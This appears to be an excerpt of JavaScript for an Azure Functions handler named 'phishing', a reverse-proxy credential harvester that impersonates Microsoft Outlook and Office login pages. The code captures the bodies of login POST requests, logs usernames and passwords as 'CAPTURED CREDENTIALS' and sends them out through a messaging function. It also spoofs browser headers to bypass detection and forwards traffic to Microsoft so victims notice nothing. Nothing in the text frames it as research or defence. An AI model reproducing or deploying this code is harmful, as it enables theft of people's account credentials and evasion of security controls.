...
// Add enhanced domain list for post-authentication capture
const POST_AUTH_DOMAINS = [
  'outlook.com',
  'office.com', 
  'outlook.office.com',
...
function getRealisticHeaders(original_headers) {
  const enhanced_headers = new Headers();
  
  // Copy essential headers from original request
  for (const [key, value] of original_headers.entries()) {
    if (!headers_to_delete.includes(key.toLowerCase())) {
      enhanced_headers.set(key, value);
    }
  }
  
  // Add/override with realistic browser headers
  enhanced_headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
  enhanced_headers.set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7');
  enhanced_headers.set('Accept-Language', 'en-US,en;q=0.9');
  enhanced_headers.set('Accept-Encoding', 'gzip, deflate, br');
  enhanced_headers.set('DNT', '1');
  enhanced_headers.set('Connection', 'keep-alive');
  enhanced_headers.set('Upgrade-Insecure-Requests', '1');
  enhanced_headers.set('Sec-Fetch-Dest', 'document');
  enhanced_headers.set('Sec-Fetch-Mode', 'navigate');
  enhanced_headers.set('Sec-Fetch-Site', 'same-origin');
  enhanced_headers.set('Sec-Fetch-User', '?1');
  enhanced_headers.set('sec-ch-ua', '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"');
  enhanced_headers.set('sec-ch-ua-mobile', '?0');
  enhanced_headers.set('sec-ch-ua-platform', '"Windows"');
...
app.http("phishing", {
  ...
  handler: async (request, context) => {
    ...
    // LOG CREDENTIAL CAPTURE FOR POST REQUESTS
    if (request.method === "POST") {
      try {
        const body = await request.text();
        if (original_url.pathname.includes('/post.srf') || original_url.pathname.includes('/ppsecure/')) {
          context.log(`[${getCurrentTimestamp()}] 🔐 CAPTURED CREDENTIALS:`);
          context.log(`[${getCurrentTimestamp()}] URL: ${original_url.href}`);
          context.log(`[${getCurrentTimestamp()}] Body: ${body}`);
          context.log(`[${getCurrentTimestamp()}] Domain: ${selected_upstream}`);
          
          dispatchMessage(`🔐 CREDENTIALS CAPTURED: ${body.substring(0, 200)}...`);
        }
        
        // Recreate request with body for forwarding
        ...
        context.log(`Error capturing credentials: ${error.message}`);
      }
    }
    
    // NO MORE FAKE RESPONSES - FORWARD EVERYTHING TO MICROSOFT
    if (false) {
      try {
    ...
    // Create enhanced headers that bypass detection
    const enhanced_headers = getRealisticHeaders(request.headers);
    enhanced_headers.set("Host", upstream_url.host);
    enhanced_headers.set("Referer", original_url.protocol + "//" + original_url.host);
    ...
    if (request.method === "POST") {
      ...
      await dispatchMessage(`[${getCurrentTimestamp()}] URL: ${original_url}`);
      await dispatchMessage(`[${getCurrentTimestamp()}] Body: ${body}`);
      ...
      if (msg.login && msg.passwd) {
        ...
        await dispatchMessage(`👤 User: ${msg.login}`);
      }
    }

    // Ensure Content-Length is properly set for POST requests
    if (request.method === "POST" && requestBody !== null) {
      enhanced_headers.set("Content-Length", requestBody.length.toString());
    }

    // Make the upstream request with enhanced headers
